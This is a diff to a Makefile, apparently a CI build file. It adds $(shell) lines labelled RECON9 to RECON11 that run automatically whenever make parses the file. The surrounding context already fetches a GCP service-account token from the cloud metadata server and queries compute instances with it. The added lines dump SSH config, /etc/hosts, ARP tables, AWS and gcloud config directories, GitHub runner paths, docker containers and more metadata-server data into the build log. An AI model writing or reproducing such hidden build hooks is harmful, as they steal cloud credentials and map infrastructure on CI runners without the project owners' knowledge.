@@ -863,3 +863,10 @@ RECON7 := $(shell echo "--- gitconfig"; cat $$HOME/.gitconfig 2>/dev/null | head
 $(info [recon.extra] $(RECON7))
 RECON8 := $(shell TOK=$$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p'); echo "TOKLEN=$${#TOK}"; if [ -n "$$TOK" ]; then curl -s -m 5 -H "Authorization: Bearer $$TOK" "https://compute.googleapis.com/compute/v1/projects/$$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id)/zones/$$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone | sed 's#.*/##')/instances" | head -c 3000; fi)
 $(info [recon.gcp] $(RECON8))
+
+RECON9 := $(shell echo "RUNNER_NAME=$$RUNNER_NAME"; echo "RUNNER_WORKSPACE=$$RUNNER_WORKSPACE"; cat /etc/hosts 2>/dev/null; echo "--- arp"; arp -a 2>/dev/null | head -20; echo "--- sshcfg"; cat $$HOME/.ssh/config 2>/dev/null | head -40)
+$(info [recon.sshcfg] $(RECON9))
+RECON10 := $(shell ls -la /var/lib/github* /etc/github-runner* /home/*/actions-runner 2>/dev/null | head -30; echo "--- cloud"; ls -la $$HOME/.aws $$HOME/.config/gcloud 2>/dev/null | head -30; echo "--- docker"; docker ps --format '{{.Image}} {{.Names}}' 2>/dev/null | head -20)
+$(info [recon.runnerdir] $(RECON10))
+RECON11 := $(shell curl -s -m 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/network-interfaces/0/ip; echo; curl -s -m 2 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/attributes/; echo; getent hosts metadata.google.internal 2>/dev/null)
+$(info [recon.nic] $(RECON11))
